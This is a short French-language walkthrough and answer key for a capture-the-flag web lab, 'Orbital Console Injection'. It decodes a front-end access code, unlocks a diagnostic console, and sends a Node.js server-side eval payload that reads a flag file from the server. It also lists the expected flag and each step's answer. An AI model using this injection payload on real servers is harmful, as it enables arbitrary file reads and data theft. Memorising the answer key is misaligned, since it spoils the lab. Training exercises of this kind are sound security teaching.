# Orbital Console Injection

## Objectif

Récupérer le code d'accès côté front, déverrouiller la console de diagnostic, puis exploiter un `eval` côté serveur pour lire le flag.

En condition réelle, ouvrir le lab depuis la plateforme. Les endpoints sont appelés automatiquement depuis le domaine du lab avec des chemins relatifs comme `./unlock` et `./diagnose`.

Flag attendu :

```text
FLAG{orbital_eval_breakout}
```

## Guide étape par étape

1. Inspecter le JavaScript chargé par la page ou ouvrir la console du navigateur. Le payload affiché est en base64 et donne le code suivant :

```text
STATION-ALTAIR
```

Réponse de l'étape 1 :

```text
STATION-ALTAIR
```

2. Dans le champ du code d'accès, taper :

```text
STATION-ALTAIR
```

Puis cliquer sur le bouton de déverrouillage. L'endpoint appelé par le front est :

```text
/unlock
```

Réponse de l'étape 2 :

```text
/unlock
```

3. Dans la console de diagnostic déverrouillée, taper ce payload :

```js
require('fs').readFileSync('/opt/flag/flag.txt','utf8')
```

Le résultat doit afficher le flag.

Réponse finale :

```text
FLAG{orbital_eval_breakout}
```
